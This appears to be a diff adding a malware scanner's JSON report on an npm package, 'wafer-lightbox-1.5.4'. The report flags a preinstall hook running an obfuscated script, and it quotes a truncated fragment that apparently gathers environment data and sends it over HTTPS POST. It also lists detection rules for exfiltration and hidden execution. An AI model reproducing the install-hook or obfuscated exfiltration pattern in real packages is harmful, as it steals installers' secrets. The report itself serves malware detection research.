@@ -1,0 +1,28 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "npm-steganography": {},
+        "npm-exec-base64": {},
+        "npm-silent-process-execution": {},
+        "npm-exfiltrate-sensitive-data": {},
+        "npm-serialize-environment": {},
+        "npm-install-script": [
+            {
+                "location": "package/package.json:7",
+                "code": "    \"preinstall\": \"node eogtktu.js\"\n",
+                "message": "The package.json has a script automatically running when the package is installed"
+            }
+        ],
+        "npm-obfuscation": [
+            {
+                "location": "package/eogtktu.js:1",
+                "code": "function a0_0x9162(){const _0x4e8834=['env','request','779kIizBa','2826cvCUQR','4kSUrTn','4Idnqgm','from','npm_package_name','https','6319495UrjoAr','7166502kEmMNZ','3306005lKnOxB','POST','11944784aPnzhx','5237460PTzgzH','base64','6040OHZko...['end']();",
+                "message": "This package is using a common obfuscation method often used by malware"
+            }
+        ],
+        "shady-links": {},
+        "npm-dll-hijacking": {}
+    },
+    "path": "./dataset/npm/wafer-lightbox-1.5.4"
+}
